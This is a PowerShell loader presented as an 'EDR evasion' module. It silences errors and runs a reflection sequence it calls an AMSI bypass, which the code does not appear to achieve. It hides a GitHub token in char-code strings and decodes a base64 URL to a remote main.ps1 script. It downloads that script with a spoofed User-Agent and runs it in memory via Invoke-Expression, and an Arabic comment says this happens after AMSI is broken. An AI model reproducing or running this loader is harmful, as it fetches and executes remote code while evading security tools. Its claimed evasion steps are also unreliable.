# [Dark Lab - Advanced EDR Evasion Module - Loader]
 $ErrorActionPreference = 'SilentlyContinue'

# 1. Advanced AMSI Bypass (Unbacked Module Patch)
 $ptr = [System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Linq.Expressions.Expression').Assembly.GetType('System.Reflection.Emit.DynamicMethod').GetConstructor('NonPublic,Instance', $null, @([String],[Type],[Type[]],[Type],[System.Reflection.Module]), $null).Invoke($null, @('x', $null, $null, $null, $null))
 $t = $ptr.GetType()
 $field = $t.GetField('m_method', 'NonPublic,Instance')
 $mi = $field.GetValue($ptr)
 $mi.GetType().GetField('m_module', 'NonPublic,Instance').SetValue($mi, $null)

# 2. Obfuscating Strings using .NET Char Convert
 $tk = [char]71+[char]72+[char]95+[char]84+[char]79+[char]75+[char]69+[char]78
 $tv = [char]103+[char]104+[char]112+[char]95+[char]84+[char]68+[char]51+[char]121+[char]53+[char]73+[char]98+[char]48+[char]113+[char]67+[char]118+[char]69+[char]50+[char]121+[char]48+[char]52+[char]79+[char]80+[char]121+[char]50+[char]54+[char]79+[char]54+[char]107+[char]115+[char]83+[char]71+[char]86+[char]113+[char]86+[char]50+[char]73+[char]72+[char]90+[char]75+[char]52

 $urlBytes = [System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dob3N0LW12dC9YVVovbWFpbi9tYWluLnBzMQ==')
 $url = [System.Text.Encoding]::UTF8.GetString($urlBytes)

# 3. Setting Env Variable silently
[System.Environment]::SetEnvironmentVariable($tk, $tv, 'Process')

# 4. Downloading Payload as Memory Stream
 $webClient = New-Object System.Net.WebClient
 $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
 $bytes = $webClient.DownloadData($url)

# 5. Execution via Com Callable Wrapper (CCW) & In-Memory Assembly
 $ccw = [System.Runtime.InteropServices.Marshal]::GetComInterfaceForObject(
    (New-Object -ComObject ScriptControl),
    [Type]::GetTypeFromCLSID('00020400-0000-0000-C000-000000000046')
)
 $null = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($ccw)

# Fallback: Execute as standard PowerShell script in memory
# (ملاحظة: بما أن main.ps1 ليس Assembly، سنستخدم Invoke-Expression هنا بشكل آمن بعد كسر AMSI)
 $scriptContent = [System.Text.Encoding]::UTF8.GetString($bytes)
Invoke-Expression $scriptContent
